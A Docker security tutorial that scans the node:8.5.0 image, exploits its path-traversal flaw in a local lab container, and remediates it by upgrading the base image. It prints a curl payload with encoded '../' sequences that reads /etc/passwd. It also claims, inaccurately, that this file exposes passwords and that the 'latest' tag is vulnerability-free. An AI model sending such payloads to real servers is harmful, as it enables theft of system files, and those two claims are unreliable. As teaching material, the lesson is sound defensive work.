## Docker Image Scanning

Docker Image scanning allows development teams to scan for vulnerabilities in their Docker images. Docker has a built-in scan command that runs on the Snyk engine. Snyk searches its vast vulnerability database to find any vulnerabilities that could be present in the given image. Scanning your images gives you the time to fix potential vulnerabilities before adversaries have the opportunity to exploit your containers. It is important for teams to regularly scan their images to be aware of any public vulnerabilities that may be hiding in their images.

In this lesson, we will be reviewing a scan of a widely used docker image, exploiting a vulnerability of that image, and remediating that vulnerability.


### Scanning
The `node:8.5.0` image is one of the most popular images on Docker Hub with over one billion pulls. The node image with the 8.5.0 tag has an [Insufficient Validation vulnerability](https://security.snyk.io/vuln/SNYK-UPSTREAM-NODE-72352) which could allow a malicious user access to a running container without validation. Docker Scan tested over 300 dependencies in the image and found over 1,000 vulnerabilities, including the previously mentioned Insufficient Validation vulnerability.


NOTE: docker scan is only available if you are logged in through Docker Hub. 

once you [login to Docker Hub](https://github.com/wadexu007/learning_by_doing/tree/main/Docker/demo#docker-hub) on your own machine then run the following command 

```
docker scan node:8.5.0
```


### Exploiting the Vulnerability
let us try to exploit this vulnerability
```
FROM node:8.5.0-slim

WORKDIR /usr/src/app

COPY package*.json ./
COPY server.js ./

RUN npm install

EXPOSE 80

CMD [ "npm", "start" ]
```

We can run the vulnerable node container. Type the following command:
```
docker run -d -p 8080:80 --name node_vulnerable vulnerable_node_image
```

Send the payload to the container by typing the following command into the terminal:

```
curl "http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/foo/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

You will see the output of the /etc/passwd file including all the users and passwords with access to this container. This payload can be changed to view other files within the container that could hold sensitive information.


### Defense
Now, we will research a node container that does not contain this vulnerability. Visit the `node` image on [Docker Hub](https://hub.docker.com/_/node), and we can see that the node container is up to version 16.xx now. Our vulnerable node version 8.5 is very old.

To fix this issue, we will change our node version to something more recent, which will have security patches applied. In the Dockerfile, we will update the node version to `node:16-slim`. Updating the version number could change the functionality, so testing will be required. Also, it is not guaranteed that the most recent version contains zero vulnerabilities, so a scan should be done as well: `docker scan node:16-slim`.


### Conclusion
This example serves to show just one vulnerability that could be hiding in any of your Docker images. Depending on your environment, there could be hundreds of Docker images to scan. Images with vulnerabilities will need to be assessed for their risk, and possibly updated to a newer version. One strategy is to use the `latest` tag for an image which will always pull the most updated, vulnerable-free version when building an image. However, this strategy is risky because it could break the functionality of your application. To check that your images do not contain vulnerabilities, it is important to schedule scans on all of your images and have a plan when a scan does return a vulnerability.

<br>